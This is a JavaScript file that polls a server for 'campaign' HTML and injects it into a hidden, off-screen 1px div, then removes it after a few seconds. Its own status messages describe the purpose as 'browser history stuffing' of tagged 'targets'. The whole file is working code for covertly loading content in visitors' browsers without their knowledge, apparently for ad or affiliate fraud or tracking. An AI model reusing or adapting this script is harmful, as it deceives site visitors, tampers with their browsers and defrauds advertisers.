
function random()
{
	return(Math.floor(Math.random()*100000000));
}
	
function send_request()
{
	var url=script+'index.php?id=700&action=scan&in_list='+list+'&in_random='+random();
	do_ajax('','',url,'');
}

function send_request2()
{
	var url=script+'index.php?id=700&action=scan1&in_list='+list+'&in_random='+random();
	do_ajax2('','',url,'');
}

function augment (oSelf, oOther) 
{
	if (oSelf == null) 
	{
		oSelf = {};
	}
	for (var i = 1; i < arguments.length; i++) 
	{
		var o = arguments[i];
		if (typeof(o) != 'undefined' && o != null) 
		{
			for (var j in o) 
			{
				oSelf[j] = o[j];
			}
		}
	}
	return oSelf;
}

//--------------------------------------------------------------------------------------------------------------------------------------------------------

var ajax_t=0;				// ajax timeout timer
var ajax_timeout=10;			// seconds
var myAjax;				// local ajax handle
var ajax_t2=0;
var done=[];

function ajaxerror()
{
	var t='<p /><center><span class="text_bold_red">Sorry, there was an error - please try again...</span></center><p />';
	if ($('ajaxerror')) { $('ajaxerror').innerHTML=t; }
	
	var loading;
	for (loading=0; loading<10; loading++)
	{
		if ($('loading'+loading+'a')) { $('loading'+loading+'a').style.display='none'; }
		if ($('loading'+loading+'b')) { $('loading'+loading+'b').style.display='none'; }
	}
	loading=81; 
	if ($('loading'+loading+'a')) { $('loading'+loading+'a').style.display='none'; }
	if ($('loading'+loading+'b')) { $('loading'+loading+'b').style.display='none'; }
	if ($('submit')) { $('submit').disabled=false; }
}

function do_ajax_timeout()
{
	myAjax.abort();
	ajaxerror();
}

function clear_ajax_timeout(msg)
{
	clearTimeout(ajax_t);
}
	
function set_ajax_timeout()
{
	ajax_t=setTimeout(function() { do_ajax_timeout(); },ajax_timeout*1000);
}

//--------------------------------------------------------------------------------------------------------------------------------------------------------
//
// Ajax
// loading  	=		div names of loading indicators should be "loading[loading]a/b"
// div		=		div id to update
// url		=		url to post to (can contain GET vars)
// options	= [optional]	form id to serialize vars from and post
//
// Usage:
// do_ajax('','div_id','http://....');					Straight ajax call
// do_ajax('','div_id','http://....',{formid: 'form_id'});		with serialized form fields as post data
//
//--------------------------------------------------------------------------------------------------------------------------------------------------------
function do_ajax(loading,div,url,options)
{
	if ($('loading'+loading+'a')) { $('loading'+loading+'a').style.display='inline'; }
	if ($('loading'+loading+'b')) { $('loading'+loading+'b').style.display='inline'; }
	if ($('submit')) { $('submit').disabled=true; }
	if ($('ajaxerror')) { $('ajaxerror').innerHTML=''; }
	
	var formdata='';	
	var options=augment({formid: ''},options);
	
	//set_ajax_timeout();
	myAjax = new Ajax.Request(url, {method: 'get',  
	onSuccess: function ajaxsuccess(transport)
		{
			clear_ajax_timeout('success');
			if (transport.responseText==='')
			{
				ajaxerror();
			}
			else
			{
				do_ajax_success(transport.responseText);
			}
		}, 
	onFailure: function ajaxfail(transport)
		{
			clear_ajax_timeout('error');
			ajaxerror();
		}
	});
}

function do_ajax2(loading,div,url,options)
{
	if ($('loading'+loading+'a')) { $('loading'+loading+'a').style.display='inline'; }
	if ($('loading'+loading+'b')) { $('loading'+loading+'b').style.display='inline'; }
	if ($('submit')) { $('submit').disabled=true; }
	if ($('ajaxerror')) { $('ajaxerror').innerHTML=''; }
	
	var formdata='';	
	var options=augment({formid: ''},options);
	
	//set_ajax_timeout();
	myAjax = new Ajax.Request(url, {method: 'get',  
	onSuccess: function ajaxsuccess(transport)
		{
			clear_ajax_timeout('success');
			if (transport.responseText==='')
			{
				ajaxerror();
			}
			else
			{
				do_ajax_success2(transport.responseText);
			}
		}, 
	onFailure: function ajaxfail(transport)
		{
			clear_ajax_timeout('error');
			ajaxerror();
		}
	});
}


function do_ajax3(loading,div,url,options)
{
	if ($('loading'+loading+'a')) { $('loading'+loading+'a').style.display='inline'; }
	if ($('loading'+loading+'b')) { $('loading'+loading+'b').style.display='inline'; }
	if ($('submit')) { $('submit').disabled=true; }
	if ($('ajaxerror')) { $('ajaxerror').innerHTML=''; }
	
	var formdata='';	
	var options=augment({formid: ''},options);
	
	//set_ajax_timeout();
	myAjax = new Ajax.Request(url, {method: 'get',  
	onSuccess: function ajaxsuccess(transport)
		{
			clear_ajax_timeout('success');
			if (transport.responseText==='')
			{
				ajaxerror();
			}
			else
			{
				do_ajax_success3(transport.responseText);
			}
		}, 
	onFailure: function ajaxfail(transport)
		{
			clear_ajax_timeout('error');
			ajaxerror();
		}
	});
}

function do_ajax_success3(x)
{
	$('send_request_div').innerHTML=x;
}

function do_ajax_success(x)
{
	if (x=='1')
	{
		if (type=='iframe')
		{
	   		$('send_request').src=script+'index.php?id=700&action=scan3'+'&in_random='+random();
		}
		else
		{
			do_ajax3('','',script+'index.php?id=700&action=scan3'+'&in_random='+random(),'');
		}
		// set timer for "period" secs to call function "send_request2"
		ajax_t2=setTimeout(function() { send_request2(); },period*1000);
	}
	else if (x=='0')
	{
		if ($('test_xxx')) { $('test_xxx').innerHTML='Browser history stuffing completed'; }
	}
	else if (x=='-')
	{
		if ($('test_xxx')) { $('test_xxx').innerHTML='Browser history stuffing not attempted as this target is tagged'; }
	}
}

// x=CAMPAIGNID|Implementation code||CAMPAIGNID|Implementation code||...etc
function do_ajax_success2(x)
{
	// "period" secs after starting
	if (x && x!='x' && x!='z')
	{
		var cams=x.split('||');
		var i,i2;
		var data;
		var cid;
		var html;
		var flag;
		var out='';
		var count=0;
		for (i=0;i<(cams.length-1);i=i+1)
		{
			data=cams[i].split('|');		
			cid=data[0];
			html=data[1];
		
			// make sure cid not in "done" array
			var flag=0;
			for (i2=0;i2<done.length;i2=i2+1)
			{
				if (done[i2]==cid) { flag=1; break; }
			}
			if (!flag && html && cid)
			{
				// add cid to done array
				done[done.length]=cid;
		
				// output html
				out=out+html;
				
				count++;
			}		
		}

		if (out)
		{
			// create a new invisible DIV and update it with the response (campaign HTML)
			var xxxxx = document.createElement('div'); 
			//xxxxx.style.visibility = 'hidden'; 
			xxxxx.style.width = '1px'; 
			xxxxx.style.height = '1px'; 
			xxxxx.style.position='absolute';
			xxxxx.style.overflow='hidden';
			xxxxx.style.top='0px';
			xxxxx.style.left='-2000px';
			xxxxx.innerHTML=out;
			document.body.appendChild(xxxxx);
			setTimeout (function() { document.body.removeChild(xxxxx); }, (count*3)*1000); // 3 secs per campaign
		}
		send_request();
	}
	else if (x=='z')
	{
		// no campaigns returned
		send_request();
	}
	else
	{
		// set timer for "period" secs to call function "send_request2"
		if ($('test2_xxx')) { $('test2_xxx').innerHTML='Sequence not completed within period'; }
		ajax_t2=setTimeout(function() { send_request2(); },period*1000);
	}
}
